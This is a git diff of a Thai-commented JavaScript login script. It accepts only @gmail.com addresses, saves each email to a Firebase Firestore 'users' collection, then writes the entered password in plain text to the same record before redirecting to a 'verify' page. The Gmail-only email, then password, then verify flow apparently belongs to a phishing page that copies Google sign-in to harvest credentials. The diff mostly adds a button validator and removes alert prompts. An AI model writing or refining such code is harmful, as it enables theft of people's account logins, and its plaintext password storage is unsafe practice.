@@ -19,22 +19,27 @@ const db = firebase.firestore();  // Firestore Database
 console.log("🔥 Firebase โหลดสำเร็จ:", firebase);
 console.log("📂 Firestore Instance:", db);
 
-// 📌 ฟังก์ชันบันทึกอีเมลลง Firestore
+// 📌 ตรวจสอบอีเมล และ ปิด/เปิดปุ่ม "ถัดไป"
+function validateEmail() {
+    let email = document.getElementById("email").value.trim();
+    let nextButton = document.getElementById("next-btn");
+
+    // ✅ เช็คว่าต้องลงท้ายด้วย @gmail.com
+    if (email.endsWith("@gmail.com")) {
+        nextButton.disabled = false; // 🔓 เปิดใช้งานปุ่ม
+    } else {
+        nextButton.disabled = true; // 🔒 ปิดปุ่มถ้ายังไม่ถูกต้อง
+    }
+}
+
+// 📌 ฟังก์ชันบันทึกอีเมลลง Firestore และไปหน้ารหัสผ่าน
 function saveEmail() {
     let email = document.getElementById("email").value.trim();
-    console.log("📩 อีเมลที่กรอก:", email);
 
-    // 🔍 ตรวจสอบว่าอีเมลลงท้ายด้วย @gmail.com หรือไม่
     if (!email.endsWith("@gmail.com")) {
-        alert("กรุณาใช้ที่อยู่อีเมลที่ลงท้ายด้วย @gmail.com");
-        return; // ❌ หยุดทำงาน ไม่ให้ไปต่อ
+        return; // ❌ ไม่ให้ไปต่อถ้าไม่ใช่ @gmail.com
     }
 
-    if (!email) {
-        return; // ❌ ไม่แจ้งเตือน แค่ไม่ให้ทำงานต่อ
-    }
-
-    // 🔥 บันทึกอีเมลลง Firestore
     db.collection("users").doc(email).set({
         email: email,
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
@@ -42,7 +47,7 @@ function saveEmail() {
     .then(() => {
         console.log("✅ อีเมลถูกบันทึกลง Firebase:", email);
         localStorage.setItem("userEmail", email);
-        window.location.href = "password.html"; // 🔄 เปลี่ยนหน้าไปใส่รหัสผ่าน
+        window.location.href = "password.html"; // ✅ ไปหน้าถัดไป
     })
     .catch(error => {
         console.error("❌ เกิดข้อผิดพลาด:", error);
@@ -57,22 +62,20 @@ function savePassword() {
     console.log("🔑 บันทึกรหัสผ่านสำหรับ:", email);
 
     if (!email) {
-        window.location.href = "index.html"; // 🔄 เปลี่ยนหน้าโดยไม่มี `alert`
+        window.location.href = "index.html"; // 🔄 กลับไปหน้าแรก
         return;
     }
 
     if (!password) {
-        alert("กรุณาป้อนรหัสผ่าน"); // แจ้งเตือนถ้ายังไม่ใส่รหัส
-        return; 
+        return; // ❌ ไม่ให้ไปต่อถ้าไม่ใส่รหัสผ่าน
     }
 
-    // 🔥 บันทึกรหัสผ่านลง Firestore
     db.collection("users").doc(email).update({
         password: password
     })
     .then(() => {
         console.log("✅ รหัสผ่านถูกบันทึกใน Firebase!");
-        window.location.href = "verify.html"; // 🔄 เปลี่ยนหน้าไปยืนยันตัวตน
+        window.location.href = "verify.html"; // ✅ ไปหน้ายืนยัน
     })
     .catch(error => {
         console.error("❌ เกิดข้อผิดพลาด:", error);
